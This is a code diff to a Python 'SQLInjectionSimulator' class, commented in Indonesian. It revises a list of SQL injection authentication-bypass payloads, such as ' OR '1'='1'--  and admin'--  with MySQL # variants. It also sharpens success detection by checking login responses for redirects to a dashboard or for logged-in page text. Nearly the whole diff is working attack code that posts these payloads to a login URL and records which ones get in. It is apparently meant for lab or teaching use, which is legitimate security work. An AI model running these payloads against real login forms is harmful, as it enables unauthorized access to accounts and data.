@@ -74,21 +74,19 @@ class SQLInjectionSimulator:
         
         # Common SQL Injection payloads untuk authentication bypass
         payloads = [
-            # Basic authentication bypass
-            {"username": "' OR '1'='1", "password": "anything"},
-            {"username": "admin'--", "password": "anything"},
-            {"username": "admin' #", "password": "anything"},
-            {"username": "' OR 1=1--", "password": "anything"},
-            {"username": "' OR '1'='1'--", "password": "anything"},
+            # Basic authentication bypass - paling efektif
+            {"username": "admin'-- ", "password": "anything"},       # Comment out password check
+            {"username": "' OR '1'='1'-- ", "password": "anything"}, # Always true condition
+            {"username": "' OR 1=1-- ", "password": "anything"},     # Always true (numeric)
+            {"username": "admin' #", "password": "anything"},        # MySQL comment
+            {"username": "' OR '1'='1' #", "password": "anything"},  # MySQL comment variant
             
-            # Using comments
-            {"username": "admin'/*", "password": "*/--"},
+            # Using OR condition
+            {"username": "' OR '1'='1", "password": "' OR '1'='1"},
+            {"username": "admin' OR '1'='1", "password": "x"},
             
             # Boolean-based
             {"username": "' OR 1=1 OR '1'='1", "password": "x"},
-            
-            # Using specific username
-            {"username": "admin' AND '1'='1", "password": "x' OR '1'='1"},
         ]
         
         successful = []
@@ -102,17 +100,32 @@ class SQLInjectionSimulator:
                 response = self.session.post(login_url, data=payload, allow_redirects=False, timeout=10)
                 
                 # Check for successful login indicators
-                if response.status_code == 302:  # Redirect to dashboard
-                    self.log(f"  [✓] SUCCESS! Authentication bypassed!", "success")
-                    successful.append(payload)
-                    self.successful_payloads.append({
-                        "type": "auth_bypass",
-                        "payload": payload,
-                        "response_code": response.status_code
-                    })
-                elif "dashboard" in response.text.lower() or "welcome" in response.text.lower():
-                    self.log(f"  [✓] SUCCESS! Authentication bypassed!", "success")
-                    successful.append(payload)
+                # 302 redirect = sukses login, akan redirect ke dashboard.php
+                if response.status_code == 302:
+                    location = response.headers.get('Location', '')
+                    if 'dashboard' in location.lower():
+                        self.log(f"  [✓] SUCCESS! Authentication bypassed! (Redirect to: {location})", "success")
+                        successful.append(payload)
+                        self.successful_payloads.append({
+                            "type": "auth_bypass",
+                            "payload": payload,
+                            "response_code": response.status_code,
+                            "redirect_to": location
+                        })
+                    else:
+                        self.log(f"  [?] Got 302 redirect to: {location}", "warning")
+                elif response.status_code == 200:
+                    # Cek apakah ada konten dashboard di response (jika tidak redirect)
+                    if "logout" in response.text.lower() and "welcome" in response.text.lower():
+                        self.log(f"  [✓] SUCCESS! Authentication bypassed! (No redirect, but logged in)", "success")
+                        successful.append(payload)
+                        self.successful_payloads.append({
+                            "type": "auth_bypass",
+                            "payload": payload,
+                            "response_code": response.status_code
+                        })
+                    else:
+                        self.log(f"  [-] Failed (Status: {response.status_code})", "warning")
                 else:
                     self.log(f"  [-] Failed (Status: {response.status_code})", "warning")
                     
